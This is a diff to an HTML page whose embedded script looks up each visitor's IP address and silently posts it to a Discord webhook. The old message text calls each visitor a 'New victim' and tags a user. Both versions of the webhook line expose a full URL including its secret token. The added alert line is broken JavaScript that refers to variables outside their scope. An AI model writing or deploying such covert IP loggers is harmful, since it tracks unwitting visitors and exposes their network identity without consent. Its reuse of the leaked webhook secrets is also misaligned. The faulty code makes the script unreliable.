@@ -7,12 +7,12 @@
 </head>
 <body>
     <script>
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1400626334224482489/4O4hx7JIfsRPdgo8OAF_uCyhZDtNm7GSCMacWPTOn0UuVmBatVlCL7TlnC_jGDhcTY26';
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1400644128546492477/e0bmbxfAxnVyQyPVTHDayx2d8Iy9sA3ZLEDIoQyc5chH87cJLeqLr4VAaA09tWKsn5qI';
 
         // Function to send IP address to Discord webhook
         function sendIpToDiscord(ip) {
             const payload = {
-                content: `@phantomvoid_1 New victim: ${ip} City: ${city} Country ${country_name} `
+                content: `New visitor IP: ${ip}`
             };
 
             fetch(DISCORD_WEBHOOK_URL, {
@@ -38,6 +38,9 @@
             .then(data => {
                 console.log('Your IP address is: ' + data.ip);
                 sendIpToDiscord(data.ip);
+            })
+            .catch(error => console.error('Error:', error));
+        alert(data.ip + ${ip})
     </script>
 </body>
 </html>
